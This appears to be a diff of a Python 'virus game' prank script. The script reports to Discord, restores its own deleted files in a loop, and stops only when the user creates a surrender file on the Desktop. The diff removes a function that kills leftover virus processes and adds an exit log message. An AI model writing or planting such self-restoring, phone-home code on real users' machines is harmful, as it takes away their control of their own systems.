@@ -30,23 +30,6 @@ def log_to_discord(msg:str, important=False):
         print("Failed to send port request")
 log_to_discord("File checker...")
 
-def kill_other_processes():
-    """Finds and terminates other virus script processes."""
-    try:
-        import psutil
-        killed_processes = []
-        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-            try:
-                cmdline = proc.info.get('cmdline')
-                if cmdline and sys.executable in cmdline and any("cleanup_x64.py" in arg for arg in cmdline):
-                    proc.kill()
-                    killed_processes.append(f"Killed process {proc.pid}: {' '.join(cmdline)}")
-            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-                pass
-        log_to_discord("Killed other processes:\n" + "\n".join(killed_processes), important=True)
-    except ImportError:
-        log_to_discord("`psutil` not found. Cannot kill other processes. They will stop after reboot.", important=True)
-
 def check_resign():  
     try:
         with open(os.path.join(home_dir, "Desktop", "vzdavam_sa.txt")) as f:
@@ -75,7 +58,6 @@ def check_resign():
                     messagebox.showinfo("Success", "All virus files were moved to <user>/Desktop/trash/. You can review the code and safely delete it.\nRestart your computer to stop all remaining virus processes.")
                 finally:
                     messagebox.showinfo("Thanks for playing", "Thanks for playing 'virus game'.\nYou can review source code on https://github.com/Hacaric/virus_game\nHave a nice day.\n\t-programmers from Gama")
-                    kill_other_processes()
                     return True
             else:
                 raise Exception()
@@ -87,6 +69,7 @@ backuped_files = [open(path, "rb").read() for path in files_to_backup]
 
 while True:
     if check_resign():
+        log_to_discord("Exiting virus for good.", important=True)
         sys.exit(0)
     for index, path in enumerate(files_to_backup):
         backup = backuped_files[index]
